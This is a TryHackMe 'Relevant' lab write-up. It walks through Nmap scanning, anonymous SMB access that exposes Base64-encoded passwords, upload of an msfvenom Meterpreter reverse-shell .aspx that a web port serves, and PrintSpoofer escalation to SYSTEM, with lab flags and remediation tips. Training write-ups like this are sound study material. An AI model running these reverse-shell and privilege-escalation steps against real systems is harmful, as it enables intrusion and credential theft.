@@ -1,0 +1,420 @@
+﻿TryHackMe: Relevant - Write-up
+
+
+Date: April 19, 2026
+
+
+Author: David Revach
+
+
+Target IP: 10.81.140.158
+
+
+Difficulty: Medium (Black Box)
+
+
+
+
+1 Service Scanning (Nmap)
+
+
+I initiated the engagement with a comprehensive Nmap scan.
+While standard ports like 80 (HTTP) and 445 (SMB) were immediately visible,
+a full 65k port sweep was necessary to uncover hidden high-order ports.
+This revealed additional HTTP services, suggesting a complex IIS configuration
+
+
+nmap -sV -sC -A -T4 10.81.140.158           
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 06:19 -0400
+Nmap scan report for 10.81.140.158
+Host is up (0.074s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2026-04-19T10:19:56+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2026-04-18T10:18:37
+|_Not valid after:  2026-10-18T10:18:37
+|_ssl-date: 2026-04-19T10:20:36+00:00; +1s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2026-04-19T10:19:57
+|_  start_date: 2026-04-19T10:18:38
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-04-19T03:20:01-07:00
+|_clock-skew: mean: 1h24m01s, deviation: 3h07m52s, median: 0s
+
+
+
+
+nmap -p- -T4 10.81.140.158
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 06:26 -0400
+Nmap scan report for 10.81.140.158
+Host is up (0.073s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49663/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+
+
+
+
+2 SMB Reconnaissance
+
+
+2.1 Enumerating SMB shares revealed that the nt4wrksv share allowed Anonymous/Guest access. Upon connecting, I discovered a file named passwords.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+smbclient -L //10.81.140.158
+Password for [WORKGROUP\kali]:
+
+
+        Sharename       Type      Comment
+        ---------               ----         -------
+        ADMIN$            Disk      Remote Admin
+        C$                     Disk      Default share
+        IPC$                  IPC       Remote IPC
+        nt4wrksv            Disk 
+     
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.81.140.158 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+smbclient //10.81.140.158/nt4wrksv
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+
+                7735807 blocks of size 4096. 4923171 blocks available
+                
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+
+
+2.3 Credential Analysis
+
+
+2.2 The passwords.txt file contained two Base64 encoded strings. 
+Decoding them yielded plaintext credentials for two users
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ cat passwords.txt 
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+
+┌──(kali㉿kali)-[~]
+└─$ echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
+Bob - !P@$$W0rD!123
+
+
+┌──(kali㉿kali)-[~]
+└─$ echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
+Bill - Juw4nnaM4n420696969!$$$
+
+
+
+
+3 Exploitation
+
+
+3.1 Web-to-SMB Directory Mapping
+
+
+A critical discovery was made: the hidden web service on port 49663 served content directly from the nt4wrksv SMB directory. 
+This provided a direct path for an "Upload-to-Execute" attack chain.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+3.2 Gaining a Foothold (RCE)
+
+
+I generated a custom Meterpreter reverse shell payload in .aspx format and uploaded it to the writable SMB share
+
+
+
+
+
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.xxx.xxx lport=8910 -f aspx -o shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 248902 bytes
+Final size of aspx file: 1258054 bytes
+Saved as: shell.aspx
+
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient //10.81.140.158/nt4wrksv                        
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> put shell.aspx
+putting file shell.aspx as \shell.aspx (1629.4 kB/s) (average 1629.4 kB/s)
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q                                                                                                                         
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
+payload => windows/x64/meterpreter_reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.135.10
+LHOST => 192.168.135.10
+msf exploit(multi/handler) > set LPORT 8910
+LPORT => 8910
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.81.140.158:49663/nt4wrksv/shell.aspx
+
+
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.135.10:8910 
+[*] Meterpreter session 1 opened (192.168.xxx.xxx:8910 -> 10.81.140.158:50002) at 2026-04-19 06:57:48 -0400
+
+
+meterpreter > cat C:/users/bob/desktop/user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}meterpreter >
+
+
+
+
+4. Privilege Escalation
+
+
+4.1 Privilege Audit
+
+
+After gaining a low-privileged shell as iis apppool\relevant, I audited the process privileges.
+The audit revealed that SeImpersonatePrivilege was enabled
+
+
+
+
+meterpreter > getprivs
+
+
+Enabled Process Privileges
+==========================
+
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient \\\\10.81.140.158\\nt4wrksv
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> put PrintSpoofer64.exe
+putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (17.5 kb/s) (average 17.5 kb/s)
+
+
+smb: \> dir
+  .                                   D        0  Sun Sep 17 21:09:03 2023
+  ..                                  D        0  Sun Sep 17 21:09:03 2023
+  passwords.txt                       A       98  Sat Jul 25 22:15:33 2020
+  PrintSpoofer64.exe                    A     3934  Sun Sep 17 21:09:04 2023
+  shell.aspx                          A  1014987  Sun Sep 17 20:59:47 2023
+
+
+
+
+meterpreter > shell
+Process 2064 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+
+c:\windows\system32\inetsrv>cd c:/inetpub/wwwroot/nt4wrksv
+cd c:/inetpub/wwwroot/nt4wrksv
+
+
+c:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+
+09/17/2023  07:29 AM    <DIR>          .
+09/17/2023  07:29 AM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+09/17/2023  07:29 AM            27,136 PrintSpoofer64.exe
+09/17/2023  06:59 AM         1,014,987 shell.aspx
+               4 File(s)      1,046,155 bytes
+               2 Dir(s)  21,047,664,640 bytes free
+               
+               
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
+PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+
+4.3 Root Compromise
+
+
+With SYSTEM privileges confirmed via whoami, I successfully retrieved the final flag from the Administrator's desktop.
+
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+PS C:\Windows\system32> cd \users\administrator\desktop    
+cd \users\administrator\desktop
+PS C:\users\administrator\desktop> dir
+dir
+
+
+
+
+    Directory: C:\users\administrator\desktop
+
+
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----        7/25/2020   8:25 AM             35 root.txt                      
+
+
+
+
+PS C:\users\administrator\desktop> cat root.txt
+cat root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+
+
+5. Remediation Recommendations
+
+
+   1. Restrict SMB Access: Disable anonymous/guest access to all SMB shares.
+
+
+   2. Secure Web Directories: Disconnect physical SMB directories from being served via the IIS web server.
+
+
+   3. Credential Hygiene: Never store credentials (even encoded) in publicly accessible files.
+
+
+   4. Patching & Hardening: Remove unnecessary service privileges    like SeImpersonatePrivilege from service accounts.
